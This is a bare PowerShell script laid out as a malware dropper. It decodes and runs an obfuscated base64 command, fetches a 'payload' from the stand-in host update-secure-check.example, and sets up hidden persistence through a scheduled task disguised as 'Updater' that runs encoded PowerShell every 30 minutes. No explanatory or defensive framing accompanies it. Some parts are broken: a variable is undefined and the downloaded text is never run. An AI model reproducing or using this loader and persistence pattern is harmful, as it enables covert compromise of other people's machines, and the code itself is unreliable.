$enc = "SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJABjAG0AZAA="
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($enc))
Invoke-Expression $decoded
$wc = New-Object Net.WebClient
$wc.DownloadString("http://update-secure-check.example/payload")
schtasks /create /sc minute /mo 30 /tn "Updater" /tr "powershell -w hidden -enc SQBFAFgA" /f
